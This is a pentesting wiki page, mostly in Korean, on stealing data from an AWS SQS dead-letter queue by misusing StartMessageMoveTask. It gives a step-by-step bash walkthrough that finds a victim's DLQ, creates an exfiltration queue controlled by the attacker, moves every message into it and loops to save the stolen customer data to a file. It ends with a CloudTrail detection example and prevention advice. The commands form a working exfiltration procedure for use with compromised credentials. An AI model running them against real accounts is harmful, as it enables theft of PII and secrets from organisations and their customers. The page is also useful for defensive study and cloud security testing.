# AWS – SQS DLQ Redrive Exfiltration via StartMessageMoveTask

{{#include ../../../banners/hacktricks-training.md}}

## Description

`SQS` 메시지 이동 작업을 악용해 피해자의 Dead-Letter Queue (DLQ)에 누적된 모든 메시지를 `sqs:StartMessageMoveTask`를 사용해 공격자가 제어하는 큐로 리디렉션하여 탈취합니다. 이 기법은 AWS의 정상적인 메시지 복구 기능을 악용해 시간이 지나며 DLQ에 축적된 민감한 데이터를 exfiltrate합니다.

## What is a Dead-Letter Queue (DLQ)?

Dead-Letter Queue는 주 애플리케이션이 정상적으로 처리하지 못한 메시지들이 자동으로 전송되는 특수한 SQS 큐입니다. 이러한 실패한 메시지들은 종종 다음을 포함합니다:
- 처리되지 못한 민감한 애플리케이션 데이터
- 오류 세부 정보 및 디버깅 정보
- Personal Identifiable Information (PII)
- API 토큰, 자격 증명 또는 기타 비밀
- 비즈니스에 중요한 트랜잭션 데이터

DLQ는 실패한 메시지들의 "무덤" 역할을 하며, 애플리케이션이 제대로 처리하지 못해 시간이 지나며 민감한 데이터를 축적하므로 매우 가치 있는 표적이 됩니다.

## Attack Scenario

**Real-world example:**
1. **E-commerce application**이 SQS를 통해 고객 주문을 처리함
2. **일부 주문이 실패**(결제 문제, 재고 문제 등)하여 DLQ로 이동함
3. **DLQ에 수주/수개월치의 실패한 주문이 누적**되어 고객 데이터가 포함됨: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **공격자가 AWS 자격 증명**을 탈취하고 SQS 권한을 획득함
5. **공격자는 DLQ에 수천 건의 민감한 실패 주문이 있음을 발견**
6. **개별 메시지에 접근하려고 시도하는 대신**(느리고 눈에 띔) 공격자는 `StartMessageMoveTask`를 사용해 모든 메시지를 자신의 큐로 일괄 전송
7. **공격자는 한 번의 작업으로** 과거에 축적된 모든 민감한 데이터를 추출

## Requirements
- 소스 큐는 반드시 DLQ로 구성되어 있어야 함(적어도 하나의 큐 RedrivePolicy로 참조됨).
- IAM 권한(피해자 주체로 실행):
- 소스(DLQ)에서: `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- 대상 큐에서: 메시지 전달 권한(예: 피해자 주체로부터의 `sqs:SendMessage`를 허용하는 큐 정책). 동일 계정 내 대상의 경우 일반적으로 기본적으로 허용됨.
- SSE-KMS가 활성화된 경우: 소스 CMK에 대해 `kms:Decrypt`, 대상 CMK에 대해 `kms:GenerateDataKey`, `kms:Encrypt`.

## Impact
DLQ에 축적된 민감한 페이로드(실패 이벤트, PII, 토큰, 애플리케이션 페이로드 등)를 네이티브 SQS API를 사용해 고속으로 exfiltrate할 수 있습니다. 대상 큐 정책이 피해자 주체의 `SendMessage`를 허용하면 cross-account에서도 동작합니다.

## How to Abuse

- 피해자 DLQ ARN을 식별하고 실제로 어떤 큐에 의해 DLQ로 참조되고 있는지 확인합니다(어떤 큐든 상관없음).
- 공격자가 제어하는 대상 큐를 생성하거나 선택하고 그 ARN을 확보합니다.
- 피해자 DLQ에서 공격자 큐로 메시지 이동 작업을 시작합니다.
- 진행 상황을 모니터링하거나 필요 시 취소합니다.

### CLI Example: Exfiltrating Customer Data from E-commerce DLQ

**Scenario**: 공격자가 AWS 자격 증명을 탈취했고, 전자상거래 애플리케이션이 실패한 고객 주문 처리 시도를 포함하는 DLQ를 사용하고 있음을 발견함.

1) **Discover and examine the victim DLQ**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **공격자가 제어하는 대상 큐 생성**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **bulk message theft 실행**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **도난당한 민감한 데이터 수집하기**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### 교차 계정 주의사항
- 대상 큐에는 피해자 주체가 `sqs:SendMessage`를 할 수 있도록 허용하는 리소스 정책이 있어야 합니다 (사용하는 경우 KMS grants/permissions 포함).

## 이 공격이 효과적인 이유

1. **Legitimate AWS Feature**: 빌트인 AWS 기능을 사용하므로 악의적 활동으로 탐지되기 어렵습니다
2. **Bulk Operation**: 느린 개별 접근 대신 수천 개의 메시지를 빠르게 전송합니다
3. **Historical Data**: DLQs는 수주/수개월에 걸쳐 민감한 데이터를 축적합니다
4. **Under the Radar**: 많은 조직이 DLQ 접근을 면밀히 모니터링하지 않습니다
5. **Cross-Account Capable**: 권한이 허용되면 공격자의 AWS 계정으로 exfiltrate할 수 있습니다

## Detection and Prevention

### Detection
의심스러운 `StartMessageMoveTask` API 호출을 CloudTrail에서 모니터링하세요:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### 예방
1. **최소 권한**: 필요한 역할에만 `sqs:StartMessageMoveTask` 권한을 제한하세요
2. **DLQs 모니터링**: 비정상적인 DLQ 활동에 대해 CloudWatch 경보를 설정하세요
3. **교차 계정 정책**: 교차 계정 접근을 허용하는 SQS 큐 정책을 주의 깊게 검토하세요
4. **DLQs 암호화**: 제한된 키 정책을 가진 SSE-KMS를 사용하세요
5. **정기 정리**: 민감한 데이터가 DLQs에 무기한 누적되지 않도록 하세요

{{#include ../../../banners/hacktricks-training.md}}
